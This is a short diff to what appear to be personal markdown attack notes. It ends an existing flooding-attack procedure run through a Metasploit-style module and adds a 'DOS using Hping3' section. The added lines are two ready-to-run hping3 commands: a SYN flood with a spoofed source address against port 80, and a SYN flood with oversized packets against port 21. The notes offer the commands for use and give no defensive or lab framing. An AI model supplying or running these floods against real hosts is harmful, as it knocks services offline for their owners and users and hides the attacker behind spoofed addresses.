@@ -25,3 +25,13 @@ When the cache cleaning is slower than the flood this attacks happen.
 6. set SHOST <middle_ip>
 7. set interface <interface_name> (in my case wln0)
 8. run
+
+
+
+
+
+# DOS using Hping3
+
+1. hping3 -S <target_ip> -a <spoof_ip> -p 80 --flood
+2. hping3 -d 65538 -S -p 21 --flood <target_ip>  --> this sends a flood of SYN packets to the target on port 21 with specific bytes of packet
+
